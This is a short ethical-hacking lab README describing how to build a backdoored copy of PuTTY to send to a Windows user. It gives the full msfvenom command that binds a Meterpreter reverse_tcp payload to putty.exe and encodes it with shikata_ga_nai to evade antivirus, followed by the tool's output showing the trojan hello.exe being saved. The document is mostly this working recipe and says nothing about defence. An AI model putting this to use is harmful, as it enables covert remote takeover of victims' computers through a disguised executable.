# Secu_03
### `Ethical hacking`
we are going to use a trapped file to send to a windows user.
`Lab: backdoor`

* Install putty<hr>
program for remote connections, 
download here <a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a>
<hr>
we will link our putty.exe file to our backdoor.

```terminal
msfvenom -a x86 -x /home/samglish/Téléchargements/putty.exe -k -p windows/meterpreter/reverse_tcp lhost=your_Ip_adress lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o hello.exe 
```
I explain to you
* msfvenom a metasploit module that will help us to :
<p>--plateform windows, create a backdoor for windows platform</p>
<p>x86/shikata_ga_nai -i 3 -b "\x00", the module that will help us encode our file so as not to be detected by the antivirus, we encoded it 3 times.</p>
<p>the output file will be hello.exe </p>

`result`
```terminal
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 408 (iteration=1)
x86/shikata_ga_nai succeeded with size 435 (iteration=2)
x86/shikata_ga_nai chosen with final size 435
Payload size: 435 bytes
Final size of exe file: 1889792 bytes
Saved as: hello.exe
```
